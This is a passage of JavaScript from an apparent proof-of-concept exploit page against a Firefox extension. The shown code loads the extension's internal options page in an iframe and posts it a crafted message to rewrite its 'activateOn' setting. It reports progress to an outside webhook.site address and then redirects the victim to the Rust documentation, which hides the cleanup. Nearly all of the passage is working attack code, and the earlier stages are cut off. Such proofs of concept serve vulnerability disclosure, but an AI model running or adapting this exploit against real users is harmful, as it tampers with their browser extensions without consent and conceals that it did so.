      // Wait 3 seconds to ensure cs.js injects <script type="module">,

      await new Promise(r => setTimeout(r, 3000));

      // Reset activateOn back to real origin
      const iframe = document.createElement('iframe');
      iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
      document.body.appendChild(iframe);

      iframe.onload = () => {
        const payload = 'https://doc.rust-lang.org/#https://doc.rust-lang.org/';
        iframe.contentWindow.postMessage(payload, '*');

        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=reset_and_redirecting', { keepalive: true });

        // Give storage time to write activateOn back before navigating to real site
        setTimeout(() => {
          window.location.href = 'https://doc.rust-lang.org/stable/std/';
        }, 2000);
      };
    }
    run();
  </script>
